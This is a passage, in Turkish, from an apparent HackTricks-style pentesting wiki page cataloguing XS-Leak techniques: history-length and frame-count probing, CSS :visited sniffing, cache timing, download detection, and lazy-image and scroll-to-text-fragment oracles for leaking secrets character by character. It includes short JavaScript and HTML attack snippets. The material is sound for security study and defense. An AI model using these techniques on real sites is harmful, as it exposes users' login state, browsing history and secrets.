Bir saldırgan, JavaScript kodunu kullanarak **çerçeve/pop-up konumunu tahmin edilen bir URL'ye** **manipüle edebilir** ve **hemen ardından** **`about:blank`**'e **değiştirebilir**. Eğer geçmiş uzunluğu arttıysa, bu, URL'nin doğru olduğu ve **artış için zaman bulduğu** anlamına gelir; çünkü URL aynıysa yeniden yüklenmez. Eğer artmadıysa, bu, **tahmin edilen URL'yi yüklemeye çalıştığı** anlamına gelir, ancak **hemen ardından** **`about:blank`**'i yüklediğimiz için, **geçmiş uzunluğu tahmin edilen URL'yi yüklerken asla artmamıştır**.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** `window.length` özelliğini inceleyerek iframe öğelerinin miktarını değerlendirin.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Bir web sayfasında `iframe` veya `window.open` ile açılan **çerçeve sayısını** saymak, kullanıcının o sayfadaki **durumunu** belirlemeye yardımcı olabilir.\
Ayrıca, eğer sayfada her zaman aynı sayıda çerçeve varsa, çerçeve sayısını **sürekli** kontrol etmek, bilgi sızdırabilecek bir **deseni** belirlemeye yardımcı olabilir.

Bu tekniğin bir örneği, Chrome'da bir **PDF**'nin **çerçeve sayımı** ile **tespit edilebilmesidir** çünkü dahili olarak bir `embed` kullanılır. `zoom`, `view`, `page`, `toolbar` gibi içeriği kontrol etmeye izin veren [Açık URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) vardır; bu teknik ilginç olabilir.

### HTMLElements

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** İki olası durumu ayırt etmek için sızdırılan değeri okuyun.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elemanları aracılığıyla bilgi sızdırılması, özellikle kullanıcı bilgilerine dayalı dinamik medya dosyaları oluşturulduğunda veya medya boyutunu değiştiren filigranlar eklendiğinde web güvenliği açısından bir endişe kaynağıdır. Bu, belirli HTML elemanları tarafından açığa çıkan bilgileri analiz ederek olası durumları ayırt etmek için saldırganlar tarafından istismar edilebilir.

### HTML Elemanları Tarafından Açığa Çıkan Bilgiler

- **HTMLMediaElement**: Bu eleman, medyanın `duration` ve `buffered` sürelerini açığa çıkarır; bunlara API'si aracılığıyla erişilebilir. [HTMLMediaElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: `videoHeight` ve `videoWidth` değerlerini açığa çıkarır. Bazı tarayıcılarda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler mevcuttur; bu da medya içeriği hakkında daha derinlemesine bilgi sunar. [HTMLVideoElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Bu fonksiyon, video oynatma kalitesi hakkında bilgiler sağlar; `totalVideoFrames` gibi, işlenen video verisinin miktarını gösterebilir. [getVideoPlaybackQuality() hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Bu eleman, bir resmin `height` ve `width` değerlerini sızdırır. Ancak, bir resim geçersizse, bu özellikler 0 dönecek ve `image.decode()` fonksiyonu reddedilecektir; bu da resmin düzgün bir şekilde yüklenmediğini gösterir. [HTMLImageElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Özelliği

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Kullanıcının durumu veya statüsü ile ilişkili web sitesi stilindeki değişiklikleri tanımlayın.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, kullanıcının durumuna bağlı olarak **web sitesi stilini** değiştirebilir. Saldırgan sayfasında **HTML bağlantı elemanı** ile çapraz kökenli CSS dosyaları gömülebilir ve **kurallar** saldırgan sayfasına **uygulanır**. Eğer bir sayfa bu kuralları dinamik olarak değiştirirse, bir saldırgan, kullanıcı durumuna bağlı olarak bu **farklılıkları** **tespit** edebilir.\
Bir sızıntı tekniği olarak, saldırgan belirli bir HTML elemanının CSS özelliklerini **okumak için** `window.getComputedStyle` yöntemini kullanabilir. Sonuç olarak, etkilenen eleman ve özellik adı biliniyorsa, saldırgan keyfi CSS özelliklerini okuyabilir.

### CSS Geçmişi

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Bir URL'ye `:visited` stilinin uygulanıp uygulanmadığını tespit edin; bu, daha önce ziyaret edildiğini gösterir.
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> [**Bu**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) kaynağına göre, bu başsız Chrome'da çalışmıyor.

CSS `:visited` seçici, daha önce kullanıcı tarafından ziyaret edilmiş URL'leri farklı şekilde stilize etmek için kullanılır. Geçmişte, bu stil farklılıklarını belirlemek için `getComputedStyle()` yöntemi kullanılabiliyordu. Ancak, modern tarayıcılar, bu yöntemin bir bağlantının durumunu açığa çıkarmasını önlemek için güvenlik önlemleri uygulamıştır. Bu önlemler, bağlantının ziyaret edilmiş gibi görünmesini sağlamak ve `:visited` seçici ile uygulanabilecek stilleri kısıtlamak için her zaman hesaplanan stili döndürmeyi içerir.

Bu kısıtlamalara rağmen, bir bağlantının ziyaret edilmiş durumunu dolaylı olarak ayırt etmek mümkündür. Bir teknik, kullanıcıyı CSS'den etkilenen bir alanla etkileşime girmeye ikna etmeyi içerir; özellikle `mix-blend-mode` özelliğini kullanarak. Bu özellik, öğelerin arka planlarıyla karışmasını sağlar ve kullanıcı etkileşimine bağlı olarak ziyaret edilmiş durumu açığa çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmadan bağlantıların render sürelerini istismar ederek tespit sağlanabilir. Tarayıcılar, ziyaret edilmiş ve ziyaret edilmemiş bağlantıları farklı şekilde render edebileceğinden, bu render süresinde ölçülebilir bir zaman farkı ortaya çıkabilir. Bir kanıt konsepti (PoC), bu tekniği zaman farkını artırmak için birden fazla bağlantı kullanarak gösteren bir Chromium hata raporunda belirtilmiştir; böylece ziyaret edilmiş durum zaman analizi ile tespit edilebilir.

Bu özellikler ve yöntemler hakkında daha fazla bilgi için belgelerine göz atın:

- `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlıklar
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** Google Chrome'da, X-Frame-Options kısıtlamaları nedeniyle bir sayfanın çapraz kökenli bir sitede gömülmesi engellendiğinde özel bir hata sayfası görüntülenir.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` başlığı "deny" veya "same-origin" olarak ayarlanmış bir sayfa bir nesne olarak gömüldüğünde, bir hata sayfası görünür. Chrome, bu nesnenin `contentDocument` özelliği için boş bir belge nesnesi (null yerine) döndürür; bu, iframe'lerde veya diğer tarayıcılarda olduğu gibi değildir. Saldırganlar, boş belgeyi tespit ederek bunu istismar edebilir ve kullanıcının durumu hakkında bilgi açığa çıkarabilir; özellikle geliştiriciler X-Frame-Options başlığını tutarsız bir şekilde ayarladıklarında, genellikle hata sayfalarını göz ardı ederler. Güvenlik başlıklarının farkında olmak ve tutarlı bir şekilde uygulanması, bu tür sızıntıları önlemek için kritik öneme sahiptir.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Başlıklar
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilirliği, dosya indirmenin başarılı olduğunu gösterir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` başlığı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği çevrimiçi olarak görüntülemek yerine indirmesi talimatını verir. Bu davranış, bir kullanıcının dosya indirmesini tetikleyen bir sayfaya erişip erişmediğini tespit etmek için istismar edilebilir. Chromium tabanlı tarayıcılarda, bu indirme davranışını tespit etmek için birkaç teknik vardır:

1. **İndirme Çubuğu İzleme**:
- Chromium tabanlı tarayıcılarda bir dosya indirildiğinde, tarayıcı penceresinin alt kısmında bir indirme çubuğu görünür.
- Pencere yüksekliğindeki değişiklikleri izleyerek, indirme çubuğunun görünümünü çıkarabilirler; bu, bir indirmenin başlatıldığını gösterir.
2. **Iframe ile İndirme Navigasyonu**:
- Bir sayfa `Content-Disposition: attachment` başlığını kullanarak bir dosya indirmesini tetiklediğinde, bu bir navigasyon olayı oluşturmaz.
- İçeriği bir iframe'de yükleyerek ve navigasyon olaylarını izleyerek, içerik durumunun bir dosya indirmesine neden olup olmadığını kontrol etmek mümkündür (navigasyon yok) veya olmadığını kontrol edebiliriz.
3. **Iframe Olmadan İndirme Navigasyonu**:
- Iframe tekniğine benzer şekilde, bu yöntem bir iframe yerine `window.open` kullanmayı içerir.
- Yeni açılan penceredeki navigasyon olaylarını izlemek, bir dosya indirmenin tetiklenip tetiklenmediğini (navigasyon yok) veya içeriğin çevrimiçi olarak görüntülenip görüntülenmediğini (navigasyon gerçekleşir) ortaya çıkarabilir.

Sadece giriş yapmış kullanıcıların bu tür indirmeleri tetikleyebildiği senaryolarda, bu teknikler, tarayıcının indirme isteğine yanıtına dayanarak kullanıcının kimlik doğrulama durumunu dolaylı olarak çıkarabilir.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilirliği, dosya indirmenin başarılı olduğunu gösterir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Bu tekniğin ilginç olmasının nedeni: Chrome artık **önbellek bölümlendirmesi** yapıyor ve yeni açılan sayfanın önbellek anahtarı: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`; ancak bir ngrok sayfası açıp içinde fetch kullanırsam, önbellek anahtarı: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)` olacaktır; **önbellek anahtarı farklıdır**, bu nedenle önbellek paylaşılmaz. Daha fazla ayrıntıyı burada bulabilirsiniz: [Önbelleği bölümlendirerek güvenlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
> ([**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) yapılan yorum)

Eğer bir site `example.com`, `*.example.com/resource` adresinden bir kaynak içeriyorsa, o kaynak, kaynağın doğrudan **üst düzey navigasyon** ile talep edilmiş gibi **aynı önbellek anahtarına** sahip olacaktır. Çünkü önbellek anahtarı, üst düzey _eTLD+1_ ve çerçeve _eTLD+1_'den oluşur.

Önbelleğe erişim, bir kaynağı yüklemekten daha hızlı olduğundan, bir sayfanın konumunu değiştirmeyi ve durdurduktan sonra 20ms (örneğin) sonra iptal etmeyi denemek mümkündür. Eğer durdurduktan sonra köken değiştiyse, bu, kaynağın önbelleğe alındığı anlamına gelir.\
Ya da sadece **potansiyel olarak önbelleğe alınmış sayfaya bazı fetch'ler gönderip geçen süreyi ölçebilirsiniz**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Yönlendirmeler
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** Bir fetch isteğine verilen yanıtın bir yönlendirme olup olmadığını bulmak mümkündür.
- **Code Example**:

![](<../../images/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** Bir kaynağı yüklemeyi denemek ve yüklenmeden önce yüklemeyi kesmek mümkündür. Bir hata tetiklenip tetiklenmediğine bağlı olarak, kaynak önbelleğe alınmış ya da alınmamıştır.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

_**fetch**_ ve _**setTimeout**_ kullanarak bir **AbortController** ile hem **kaynağın önbelleğe alınıp alınmadığını** tespit etmek hem de belirli bir kaynağı tarayıcı önbelleğinden çıkarmak mümkündür. Ayrıca, bu işlem yeni içerik önbelleğe almadan gerçekleşir.

### Script Pollution

- **Inclusion Methods**: HTML Elemanları (script)
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** Yerleşik fonksiyonları **aşırı yazmak** ve bunların argümanlarını okumak mümkündür; bu, **çapraz kökenli script**'lerden bile (doğrudan okunamaz) değerli bilgileri **sızdırabilir**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Service worker kullanarak bir webin yürütme süresini ölçün.
- **Code Example**:

Verilen senaryoda, saldırgan, kendi alanlarından biri olan "attacker.com" içinde bir **service worker** kaydetme girişiminde bulunur. Ardından, saldırgan ana belgede hedef web sitesinde yeni bir pencere açar ve **service worker**'a bir zamanlayıcı başlatmasını talimatını verir. Yeni pencere yüklenmeye başladığında, saldırgan önceki adımda elde edilen referansı **service worker** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin gelmesiyle, **service worker** **204 (No Content)** durum kodu ile yanıt verir ve navigasyon sürecini etkili bir şekilde sonlandırır. Bu noktada, **service worker** daha önce başlatılan zamanlayıcıdan bir ölçüm alır. Bu ölçüm, JavaScript'in navigasyon sürecinde neden olduğu gecikmelerin süresinden etkilenir.

> [!WARNING]
> Bir yürütme zamanlamasında, **daha hassas ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfa yüklenmeden önce sayfanın kullandığı kaynakları yükleyerek.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Bir isteği gerçekleştirmek için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** `window.open` kullanarak bir isteği gerçekleştirmek için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)


## With HTML or Re Injection

Burada, **HTML içeriği enjekte ederek** çapraz kökenli bilgileri dışa aktarmak için teknikler bulabilirsiniz. Bu teknikler, herhangi bir nedenle **HTML enjekte edebiliyorsanız ancak JS kodu enjekte edemiyorsanız** ilginçtir.

### Dangling Markup

{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Eğer **içeriği dışa aktarmanız** gerekiyorsa ve **sırrın öncesine HTML ekleyebiliyorsanız**, **yaygın dangling markup tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenle **HARF HARF** yapmanız **GEREKİYORSA** (belki iletişim bir önbellek vuruşu aracılığıyla) bu hileyi kullanabilirsiniz.

HTML'deki **resimler**, değeri "**lazy**" olan bir "**loading**" niteliğine sahiptir. Bu durumda, resim, sayfa yüklenirken değil, görüntülendiğinde yüklenecektir:
```html
<img src=/something loading=lazy >
```
Bu nedenle, yapabileceğiniz şey, **gizli bilgiden önce web sayfasını doldurmak için çok sayıda gereksiz karakter eklemek** (örneğin **binlerce "W"**) veya **şuna benzer bir şey eklemek** `<br><canvas height="1850px"></canvas><br>.`\
Örneğin, eğer **enjeksiyonumuz bayraktan önce görünüyorsa**, **görüntü** **yüklenir**, ancak **bayraktan sonra** görünüyorsa, bayrak + gereksiz karakterler **yüklenmesini engelleyecektir** (ne kadar gereksiz karakter ekleyeceğinizle oynamanız gerekecek). Bu, [**bu yazıda**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) olan şeydir.

Başka bir seçenek, **izin verilirse scroll-to-text-fragment** kullanmaktır:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya erişmesini** sağlarsınız, bununla birlikte bir şey gibi
```
#:~:text=SECR
```
Web sayfası şöyle bir şey olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html, saldırganın gereksiz karakterlerini ve tembel yükleme görüntüsünü içerir ve ardından botun sırrı eklenir.

Bu metin, botun sayfadaki `SECR` metnini içeren herhangi bir metne erişmesini sağlayacaktır. Bu metin sırdır ve **görüntünün hemen altında** yer almaktadır, **gizli kelime doğru tahmin edilirse görüntü yalnızca yüklenecektir**. Böylece, **sırrı karakter karakter dışarı sızdırmak için oracliniz** var.

Bunu istismar etmek için bir kod örneği: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Görüntü Tembel Yükleme Zamanına Dayalı

Eğer **harici bir görüntüyü yüklemek mümkün değilse**, bu, saldırgana görüntünün yüklendiğini gösterebilir, başka bir seçenek ise **karakteri birkaç kez tahmin etmeye çalışmak ve bunu ölçmektir**. Eğer görüntü yüklenirse, tüm istekler, görüntü yüklenmediğinde olduğundan daha uzun sürecektir. Bu, [**bu yazının çözümünde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **özetlenen** şeydir:

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Eğer `jQuery(location.hash)` kullanılıyorsa, zamanlama yoluyla **bazı HTML içeriğinin var olup olmadığını** bulmak mümkündür, çünkü eğer `main[id='site-main']` seçici eşleşmiyorsa, geri kalan **seçicileri** kontrol etmesine gerek yoktur:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection

{{#ref}}
css-injection/
{{#endref}}

## Defenses

Bu tekniklere karşı nasıl korunacağınız hakkında daha fazla bilgi için [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ve wiki'nin her bölümünde [https://xsleaks.dev/](https://xsleaks.dev/) önerilen önlemler bulunmaktadır.

## References

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../../banners/hacktricks-training.md}}
